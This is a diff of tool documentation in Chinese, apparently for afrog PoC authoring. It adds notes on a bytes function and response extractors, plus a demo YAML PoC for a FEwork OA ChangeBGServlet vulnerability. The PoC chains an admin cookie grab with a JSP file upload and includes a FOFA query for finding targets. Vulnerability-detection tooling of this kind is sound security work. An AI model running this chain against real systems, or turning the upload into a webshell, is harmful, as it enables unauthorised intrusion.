@@ -54,6 +54,101 @@ POC编写函数文档:
 
 ![image-20251023100418222](/assets/image-20251023100418222.png)
 
+### bytes
+
+新增 `bytes` 用于将 set 变量或 hex 字符串转换为字节流进行匹配 例如：bytes(rand_str)
+
+![image-20251205172959192](/assets/image-20251205172959192.png)
+
+填入`set `设置的值 `rand_str` 
+
+## Extractors 数据提取器
+
+新增 Extractors  用于从响应中提取变量，供后续规则使用。
+
+![image-20251205213443709](/assets/image-20251205213443709.png)
+
+### 新建规则
+
+![image-20251205214017169](/assets/image-20251205214017169.png)
+
+填好正则就可以保存了
+
+![image-20251205214109021](J:\编程语言\TypeScript\afrog-poc-generation\assets\image-20251205214109021.png)
+
+在第二个请求中，填入匹配符 `{{title['title']}}`
+
+![image-20251205214727917](/assets/image-20251205214727917.png)
+
+匹配结果
+
+![image-20251205214755731](/assets/image-20251205214755731.png)
+
+### demo poc
+
+![image-20251205225309476](/assets/image-20251205225309476.png)
+
+```
+id: poc-feiqi-changebgservlet
+
+info:
+  name: poc-feiqi-ChangeBGServlet
+  author: moda
+  severity: high
+  description: |
+    飞企互联OA FEwork ChangeBGServlet 命令执行漏洞(QVD-2025-25776)
+    
+    FOFA：app="FE-协作平台"
+  reference:
+    - https://example.com
+  tags: 飞企互联OA, rec
+
+set:
+  rand_str: randomLowercase(30)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mobileKey
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/88.0.772.137 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: userName=admin
+    output:
+      SCookie: '"Set-Cookie: (?P<SCookie>.+) Path=".bsubmatch(response.raw_header)'
+    expression: response.status == 200 && response.body.bcontains(b"true")
+  r1:
+    request:
+      method: POST
+      path: /servlet/ChangeBGServlet
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+        Cookie: "{{SCookie['SCookie']}}"
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      body: |
+        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+        Content-Disposition: form-data; name="file"; filename="test.jsp"
+        Content-Type: text/plain
+        
+        {{rand_str}}
+        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
+    output:
+      Paths: '"\"saveName\":\"(?P<Paths>.+)\",".bsubmatch(response.body)'
+    expression: response.status == 200
+  r2:
+    request:
+      method: GET
+      path: /login/applyTheme/images/porttal/login/{{Paths['Paths']}}
+      headers:
+        Cookie: "{{SCookie['SCookie']}}"
+    expression: response.status == 200 && response.body.bcontains(bytes(rand_str))
+
+expression: r0() && r1() && r2()
+
+```
+
 
 
 ## 本地运行
